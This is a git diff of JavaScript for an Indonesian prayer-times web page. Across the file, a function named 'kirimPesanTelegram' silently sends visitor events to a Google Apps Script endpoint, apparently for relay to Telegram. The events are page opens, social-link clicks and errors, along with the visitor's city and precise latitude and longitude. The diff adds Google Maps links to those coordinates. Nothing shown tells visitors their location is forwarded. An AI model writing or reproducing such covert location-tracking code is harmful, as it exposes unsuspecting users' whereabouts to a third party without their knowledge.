@@ -10,11 +10,6 @@ function updateJam() {
     document.getElementById("jam-digital").innerText = `${jam}:${menit}:${detik}`;
     return `${jam}:${menit}:${detik}`;
 }
-setInterval(updateJam, 1000);
-
-function kirimPesanTelegram(pesan) {
-    fetch(`https://script.google.com/macros/s/AKfycbzF9PEMsGd-RBRfo3ym6Zbaii5-lckSXGmAoepevRu6xFApFtzR3GQwtyTo2TmKHYi-Zg/exec?pesan=${encodeURIComponent(pesan)}`);
-}
 
 function tampilkanError(pesan) {
     document.getElementById("loading").style.display = "none";
@@ -22,18 +17,19 @@ function tampilkanError(pesan) {
     document.getElementById("error-message").style.display = "block";
 }
 
-window.onload = function() {
+function kirimPesanTelegram(pesan) {
+    fetch(`https://script.google.com/macros/s/AKfycbzF9PEMsGd-RBRfo3ym6Zbaii5-lckSXGmAoepevRu6xFApFtzR3GQwtyTo2TmKHYi-Zg/exec?pesan=${encodeURIComponent(pesan)}`);
+}
+
+window.onload = function () {
     document.getElementById("kota").style.display = "none";
     document.getElementById("error-message").style.display = "none";
     document.getElementById("tanggal").style.display = "none";
     document.getElementById("jam-digital").style.display = "none";
 
-    function ambilNamaKota(latValue, lonValue) {
-        return fetch(`https://nominatim.openstreetmap.org/reverse?format=json&lat=${latValue}&lon=${lonValue}`)
-            .then(res => {
-                if (res.status === 429) throw new Error("Rate limit");
-                return res.json();
-            })
+    function ambilNamaKota(latVal, lonVal) {
+        return fetch(`https://nominatim.openstreetmap.org/reverse?format=json&lat=${latVal}&lon=${lonVal}`)
+            .then(res => res.json())
             .then(data => {
                 kota = data.address.city || data.address.town || data.address.village || data.address.county || "Lokasi Tidak Dikenal";
                 document.getElementById("kota").innerText = kota;
@@ -44,10 +40,10 @@ window.onload = function() {
                 const jam = waktu.toTimeString().split(" ")[0];
                 const tanggal = waktu.toLocaleDateString('id-ID', { weekday: 'long', year: 'numeric', month: 'long', day: 'numeric' });
                 kirimPesanTelegram(
-                  "▬▬▬▬▬ JADWAL SHOLAT ▬▬▬▬▬\n" +
-                  "Gagal ambil nama kota.\n" +
-                  "▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬\n" +
-                  `Tanggal: ${tanggal}\nJam: ${jam}`
+                    "▬▬▬▬▬ JADWAL SHOLAT ▬▬▬▬▬\n" +
+                    "Gagal ambil nama kota.\n" +
+                    "▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬\n" +
+                    `Tanggal: ${tanggal}\nJam: ${jam}`
                 );
                 tampilkanError("Gagal memuat kota.");
             });
@@ -58,22 +54,27 @@ window.onload = function() {
             pos => {
                 lat = pos.coords.latitude;
                 lon = pos.coords.longitude;
-                ambilNamaKota(lat, lon).then(() => tampilkanJadwal(lat, lon));
+                ambilNamaKota(lat, lon).then(() => {
+                    tampilkanJadwal(lat, lon);
+                });
             },
             () => {
                 const waktu = new Date();
                 const jam = waktu.toTimeString().split(" ")[0];
                 const tanggal = waktu.toLocaleDateString('id-ID', { weekday: 'long', year: 'numeric', month: 'long', day: 'numeric' });
                 kirimPesanTelegram(
-                  "▬▬▬▬▬ JADWAL SHOLAT ▬▬▬▬▬\n" +
-                  "Gagal ambil lokasi: Izin ditolak.\n" +
-                  "▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬\n" +
-                  `Tanggal: ${tanggal}\nJam: ${jam}`
+                    "▬▬▬▬▬ JADWAL SHOLAT ▬▬▬▬▬\n" +
+                    "Gagal ambil lokasi: Izin ditolak.\n" +
+                    "▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬\n" +
+                    `Tanggal: ${tanggal}\nJam: ${jam}`
                 );
                 tampilkanError("Izin lokasi ditolak. Jadwal tidak dapat ditampilkan.");
             }
         );
     }
+
+    updateJam();
+    setInterval(updateJam, 1000);
 
     document.querySelectorAll('.sosmed-link').forEach(link => {
         link.addEventListener('click', () => {
@@ -81,13 +82,17 @@ window.onload = function() {
             const waktu = new Date();
             const jam = waktu.toTimeString().split(" ")[0];
             const tanggal = waktu.toLocaleDateString('id-ID', { weekday: 'long', year: 'numeric', month: 'long', day: 'numeric' });
+            const linkMaps = lat && lon ? `https://www.google.com/maps?q=${lat},${lon}` : "Belum diketahui";
 
             kirimPesanTelegram(
-              "▬▬▬▬▬ JADWAL SHOLAT ▬▬▬▬▬\n" +
-              `Pengunjung mengklik link ${nama}\n` +
-              "▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬\n" +
-              `Tanggal: ${tanggal}\nJam: ${jam}\n` +
-              `Lokasi: ${kota || "Belum diketahui"}\nLatitude: ${lat || "Belum diketahui"}\nLongitude: ${lon || "Belum diketahui"}`
+                "▬▬▬▬▬ JADWAL SHOLAT ▬▬▬▬▬\n" +
+                `Pengunjung mengklik link ${nama}\n` +
+                "▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬\n" +
+                `Tanggal: ${tanggal}\nJam: ${jam}\n` +
+                `Lokasi: ${kota || "Belum diketahui"}\n` +
+                `Latitude: ${lat || "Belum diketahui"}\n` +
+                `Longitude: ${lon || "Belum diketahui"}\n` +
+                `Link Maps: ${linkMaps}`
             );
         });
     });
@@ -116,13 +121,17 @@ function tampilkanJadwal(lat, lon) {
                 const [tgl, blnEn, thn] = readableDate.split(" ");
                 const tanggalIndo = `${hariMap[weekdayEn]}, ${tgl} ${bulanMap[blnEn]} ${thn}`;
                 const jamSekarang = updateJam();
+                const linkMaps = `https://www.google.com/maps?q=${lat},${lon}`;
 
                 kirimPesanTelegram(
-                  "▬▬▬▬▬ JADWAL SHOLAT ▬▬▬▬▬\n" +
-                  "Pengunjung membuka halaman\n" +
-                  "▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬\n" +
-                  `Tanggal: ${tanggalIndo}\nJam: ${jamSekarang}\n` +
-                  `Lokasi: ${kota || "Belum diketahui"}\nLatitude: ${lat}\nLongitude: ${lon}`
+                    "▬▬▬▬▬ JADWAL SHOLAT ▬▬▬▬▬\n" +
+                    "Pengunjung membuka halaman\n" +
+                    "▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬\n" +
+                    `Tanggal: ${tanggalIndo}\nJam: ${jamSekarang}\n` +
+                    `Lokasi: ${kota || "Belum diketahui"}\n` +
+                    `Latitude: ${lat || "Belum diketahui"}\n` +
+                    `Longitude: ${lon || "Belum diketahui"}\n` +
+                    `Link Maps: ${linkMaps}`
                 );
 
                 document.getElementById("jadwal").style.transform = "translateX(-5%)";
@@ -144,10 +153,10 @@ function tampilkanJadwal(lat, lon) {
                 const jam = waktu.toTimeString().split(" ")[0];
                 const tanggal = waktu.toLocaleDateString('id-ID', { weekday: 'long', year: 'numeric', month: 'long', day: 'numeric' });
                 kirimPesanTelegram(
-                  "▬▬▬▬▬ JADWAL SHOLAT ▬▬▬▬▬\n" +
-                  "Gagal memuat jadwal.\n" +
-                  "▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬\n" +
-                  `Tanggal: ${tanggal}\nJam: ${jam}`
+                    "▬▬▬▬▬ JADWAL SHOLAT ▬▬▬▬▬\n" +
+                    "Gagal memuat jadwal.\n" +
+                    "▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬\n" +
+                    `Tanggal: ${tanggal}\nJam: ${jam}`
                 );
                 tampilkanError("Gagal memuat jadwal.");
             }
@@ -157,10 +166,10 @@ function tampilkanJadwal(lat, lon) {
             const jam = waktu.toTimeString().split(" ")[0];
             const tanggal = waktu.toLocaleDateString('id-ID', { weekday: 'long', year: 'numeric', month: 'long', day: 'numeric' });
             kirimPesanTelegram(
-              "▬▬▬▬▬ JADWAL SHOLAT ▬▬▬▬▬\n" +
-              "Gagal ambil jadwal sholat.\nAPI tidak merespons.\n" +
-              "▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬\n" +
-              `Tanggal: ${tanggal}\nJam: ${jam}`
+                "▬▬▬▬▬ JADWAL SHOLAT ▬▬▬▬▬\n" +
+                "Gagal ambil jadwal sholat.\nAPI tidak merespons.\n" +
+                "▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬\n" +
+                `Tanggal: ${tanggal}\nJam: ${jam}`
             );
             tampilkanError("Tidak dapat terhubung ke server.");
         });
